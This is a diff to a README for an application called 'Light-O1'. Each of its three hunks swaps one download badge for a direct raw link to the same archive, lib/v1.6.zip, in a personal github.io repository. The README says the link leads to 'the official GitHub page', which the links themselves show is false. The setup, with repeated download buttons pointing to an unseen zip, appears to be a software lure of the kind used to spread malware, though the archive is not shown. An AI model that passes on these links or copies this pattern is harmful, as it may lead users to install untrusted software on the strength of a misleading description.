@@ -7,7 +7,7 @@ description: "Unlock transparent, step-by-step reasoning with Light-O1, an open-
 
 <div align="center">
 
-[![Download Light-O1](https://img.shields.io/badge/⬇️%20Download-Light--O1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mattialesto/mattialesto.github.io/raw/refs/heads/main/lib/v1.6.zip)
+[![Download Light-O1](https://img.shields.io/badge/⬇️%20Download-Light--O1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/lib/v1.6.zip)
 
 </div>
 
@@ -43,7 +43,7 @@ The name says it all. Light-O1 is optimized to run efficiently on standard Windo
 
 Visit this link to download the application:
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Light--O1-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mattialesto/mattialesto.github.io/raw/refs/heads/main/lib/v1.6.zip)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Light--O1-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/lib/v1.6.zip)
 
 This will take you to the official GitHub page where you'll find the latest version of Light-O1.
 
@@ -132,7 +132,7 @@ Light-O1 isn't just software—it's a community of curious minds who love learni
 
 Ready to experience smarter AI reasoning? Click the button below to get started:
 
-[![Get Light-O1 Now](https://img.shields.io/badge/🚀%20Get%20Light--O1%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mattialesto/mattialesto.github.io/raw/refs/heads/main/lib/v1.6.zip)
+[![Get Light-O1 Now](https://img.shields.io/badge/🚀%20Get%20Light--O1%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/lib/v1.6.zip)
 
 **Visit this link to download the application.** It takes less than a minute to get Light-O1 running on your computer.
 
